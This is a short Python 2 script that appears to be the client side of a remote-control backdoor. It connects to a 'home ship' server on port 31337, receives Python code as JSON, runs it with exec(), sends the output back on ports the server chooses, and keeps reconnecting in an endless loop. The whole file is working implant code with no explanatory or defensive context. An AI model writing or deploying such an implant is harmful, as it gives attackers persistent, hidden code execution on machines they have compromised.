#!/usr/bin/python

import socket,subprocess,time,getpass,fcntl,struct,os,json,sys
from cStringIO import StringIO

HOST = "127.0.0.1"     # The home ship
STATICPORT = 31337     # The same port as used by the server
PORT = -1
SCRIPTNAME = os.path.basename(__file__)

def readuntil(s):
	b = ""
	while chr(255) not in b:
		b += s.recv(1)
	return b

def migratePorts(port, data):
	PORT = int(port)
	time.sleep(3)
	print "[~] Migrating to {0}".format(PORT)

	global s
	s.close()
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	s.connect((HOST, PORT))
	s.send(json.dumps({"data": data})+chr(255))

def code(command, port):
	if command:
		print '[~] Running "{0}"'.format(command)

	try:
		output = ""

		if command:
			old_stdout = sys.stdout
			redirected_output = sys.stdout = StringIO()
			exec(command)
			sys.stdout = old_stdout

			output = redirected_output.getvalue()

		try:
			migratePorts(port, output)
		except:
			s.close()
			time.sleep(5)
			main()
	except:
		pass


def main():
	global s
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5)
		s.connect((HOST, STATICPORT))

		while(1):
				data = readuntil(s)[:-1]
				data = json.loads(data)
				code(data["code"], data['newport'])
	except:
		time.sleep(5)

	main()

main()

